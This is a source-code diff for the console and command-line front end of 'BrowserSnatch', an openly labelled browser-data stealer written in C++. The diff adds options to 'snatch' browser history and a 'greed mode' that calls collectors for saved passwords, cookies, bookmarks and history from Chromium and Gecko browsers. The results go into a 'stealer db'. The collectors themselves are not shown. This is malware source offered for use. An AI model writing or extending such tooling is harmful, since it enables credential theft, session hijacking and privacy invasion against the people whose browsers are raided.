@@ -18,7 +18,7 @@ void Visualizer::visualization_main() {
     int choice;
     do {
         printMenu();
-        std::cout << "\n\033[1;34mChoose an option to proceed (0-7): \033[0m";
+        std::cout << "\n\033[1;34mChoose an option to proceed (0-9): \033[0m";
         std::cin >> choice;
 
         handleUserChoice(choice);
@@ -50,7 +50,9 @@ void Visualizer::printMenu() {
     std::cout << " \033[1;36m[4]\033[0m Snatch Gecko Based Browser Cookies" << std::endl;
     std::cout << " \033[1;36m[5]\033[0m Snatch Chromium Based Browser Bookmarks" << std::endl;
     std::cout << " \033[1;36m[6]\033[0m Snatch Gecko Based Browser Bookmarks" << std::endl;
-    std::cout << " \033[1;36m[7]\033[0m Snatch Passwords & Cookies {default settings}" << std::endl;
+    std::cout << " \033[1;36m[7]\033[0m Snatch Chromium Based Browser History" << std::endl;
+    std::cout << " \033[1;36m[8]\033[0m Snatch Gecko Based Browser History" << std::endl;
+    std::cout << " \033[1;36m[9]\033[0m Snatch Passwords & Cookies {default settings}" << std::endl;
     std::cout << " \033[1;31m[0]\033[0m Exit" << std::endl;
     printDivider('=', 75);
 }
@@ -65,11 +67,48 @@ BOOL Visualizer::default_settings(std::string converted_username, std::string st
     if (!gecko_parser(converted_username, stealer_db))
         std::cout << "Gecko Browsers dump failed!" << std::endl;
 
+    if (!chromium_cookie_collector(converted_username, stealer_db))
+        std::cout << "Chromium Cookie Collector failed!" << std::endl;
+
     if (!gecko_cookie_collector(converted_username, stealer_db))
         std::cout << "Gecko Cookie Collector failed!" << std::endl;
 
+    if (std::filesystem::exists(stealer_db)) {
+        std::cout << "Stealer db saved: " << stealer_db << std::endl;
+        return true;
+    }
+    else {
+        return false;
+    }
+}
+
+BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_db)
+{
+    std::cout << "BrowserSnatch Executed with {greed_mode_settings}" << std::endl;
+    std::cout << "Snatching everything..." << std::endl;
+    if (!chromium_parser(converted_username, stealer_db))
+        std::cout << "Chromium Browsers dump failed!" << std::endl;
+
+    if (!gecko_parser(converted_username, stealer_db))
+        std::cout << "Gecko Browsers dump failed!" << std::endl;
+
     if (!chromium_cookie_collector(converted_username, stealer_db))
         std::cout << "Chromium Cookie Collector failed!" << std::endl;
+
+    if (!gecko_cookie_collector(converted_username, stealer_db))
+        std::cout << "Gecko Cookie Collector failed!" << std::endl;
+
+    if (!chromium_bookmarks_collector(converted_username, stealer_db))
+        std::cout << "Chromium Bookmarks Collector failed!" << std::endl;
+
+    if (!gecko_bookmarks_collector(converted_username, stealer_db))
+        std::cout << "Gecko Bookmarks Collector failed!" << std::endl;
+
+    if (!chromium_history_collector(converted_username, stealer_db))
+        std::cout << "Chromium History Collector failed!" << std::endl;
+
+    if (!gecko_history_collector(converted_username, stealer_db))
+        std::cout << "Gecko History Collector failed!" << std::endl;
 
     if (std::filesystem::exists(stealer_db)) {
         std::cout << "Stealer db saved: " << stealer_db << std::endl;
@@ -125,9 +164,23 @@ void Visualizer::handleUserChoice(int choice) {
             std::cout << "Stealer db path: " << stealer_db << std::endl;
         break;
     case 7:
+        std::cout << "\n\033[1;33m>> Snatching Chromium History...\033[0m" << std::endl;
+        if (!chromium_history_collector(converted_username, stealer_db))
+            std::cerr << "Chromium History Snatch Failed" << std::endl;
+        else
+            std::cout << "Stealer db path: " << stealer_db << std::endl;
+        break;
+    case 8:
+        std::cout << "\n\033[1;33m>> Snatching Gecko History...\033[0m" << std::endl;
+        if (!gecko_history_collector(converted_username, stealer_db))
+            std::cerr << "Gecko History Snatch Failed" << std::endl;
+        else
+            std::cout << "Stealer db path: " << stealer_db << std::endl;
+        break;
+    case 9:
         std::cout << "\n\033[1;33m>> Snatching Passwords and Cookies {default settings}...\033[0m" << std::endl;
         if (!default_settings(converted_username, stealer_db))
-            std::cerr << "BrowserSnatch executed with {default settings}" << std::endl;
+            std::cerr << "BrowserSnatch executed with {default settings}: failed" << std::endl;
         break;
     case 0:
         std::cout << "\n\033[1;31mExiting BrowserSnatch. Goodbye!\033[0m" << std::endl;
@@ -153,6 +206,10 @@ void Visualizer::displayHelp() {
     std::cout << "  -bookmarks        Snatch bookmarks from every browser\n";
     std::cout << "  -bookmarks -c     Snatch bookmarks from Chromium browsers only\n";
     std::cout << "  -bookmarks -g     Snatch bookmarks from Gecko browsers only\n";
+    std::cout << "  -history          Snatch history from every browser\n";
+    std::cout << "  -history -c       Snatch history from Chromium browsers only\n";
+    std::cout << "  -history -g       Snatch history from Gecko browsers only\n";
+    std::cout << "  -greed            Snatch everything\n";
     std::cout << "  -console-mode     Launch BrowserSnatch Console Mode\n\n";
     std::cout << "For more details, visit: https://shaddy43.github.io\n";
 }
@@ -221,6 +278,33 @@ void Visualizer::handler(int option)
             std::cerr << "Bookmarks Snatch Failed" << std::endl;
         else
             std::cout << "Stealer db path: " << stealer_db << std::endl;
+    }
+    else if (option == 10)
+    {
+        if (!chromium_history_collector(converted_username, stealer_db))
+            std::cerr << "History Snatch Failed" << std::endl;
+        else
+            std::cout << "Stealer db path: " << stealer_db << std::endl;
+    }
+    else if (option == 11)
+    {
+        if (!gecko_history_collector(converted_username, stealer_db))
+            std::cerr << "History Snatch Failed" << std::endl;
+        else
+            std::cout << "Stealer db path: " << stealer_db << std::endl;
+    }
+    else if (option == 12)
+    {
+        if (!chromium_history_collector(converted_username, stealer_db) or !gecko_history_collector(converted_username, stealer_db))
+            std::cerr << "History Snatch Failed" << std::endl;
+        else
+            std::cout << "Stealer db path: " << stealer_db << std::endl;
+    }
+    else if (option == 13)
+    {
+        //greed mode
+        if (!greed_mode(converted_username, stealer_db))
+            std::cerr << "BrowserSnatch executed with {greed mode}: failed" << std::endl;
     }
     else
     {
